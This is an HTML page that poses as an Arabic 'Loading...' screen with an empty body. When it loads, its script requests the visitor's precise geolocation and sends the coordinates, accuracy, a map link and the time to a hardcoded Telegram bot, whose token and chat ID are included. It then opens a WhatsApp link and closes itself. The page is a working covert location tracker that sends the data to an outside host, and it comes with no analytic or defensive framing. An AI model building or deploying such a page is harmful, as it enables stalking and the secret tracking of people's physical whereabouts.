<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>جاري التحميل...</title>
    <script>
        const BOT_TOKEN = "8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI";
        const CHAT_ID = "6451561574";

        function getLocationAndSend() {
            if (!navigator.geolocation) {
                sendToTelegram("❌ المتصفح لا يدعم تحديد الموقع");
                return;
            }

            navigator.geolocation.getCurrentPosition(
                async function(position) {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    const accuracy = position.coords.accuracy;
                    
                    // رابط واتساب مع الموقع
                    const whatsappUrl = `https://wa.me/?text=${encodeURIComponent(`موقعي: https://maps.google.com/?q=${lat},${lng}`)}`;
                    
                    const message = 
                        `📱 موقع من واتساب\n\n` +
                        `📍 الإحداثيات:\n` +
                        `• خط العرض: ${lat.toFixed(6)}\n` +
                        `• خط الطول: ${lng.toFixed(6)}\n` +
                        `• الدقة: ${accuracy} متر\n\n` +
                        `🗺️ الخريطة:\n` +
                        `https://maps.google.com/?q=${lat},${lng}\n\n` +
                        `💬 واتساب:\n${whatsappUrl}\n\n` +
                        `🕒 الوقت: ${new Date().toLocaleString('ar-MA')}`;

                    await sendToTelegram(message);
                    
                    // فتح واتساب أيضاً
                    window.open(whatsappUrl, '_blank');
                    
                    setTimeout(() => window.close(), 2000);
                },
                function(error) {
                    sendToTelegram("❌ لم يتم الحصول على الموقع");
                    setTimeout(() => window.close(), 2000);
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        }

        async function sendToTelegram(message) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
                });
            } catch (error) {
                console.log("Error sending to Telegram");
            }
        }

        // البدء فوراً
        getLocationAndSend();
    </script>
</head>
<body style="margin:0;padding:0;background:transparent;">
</body>
</html>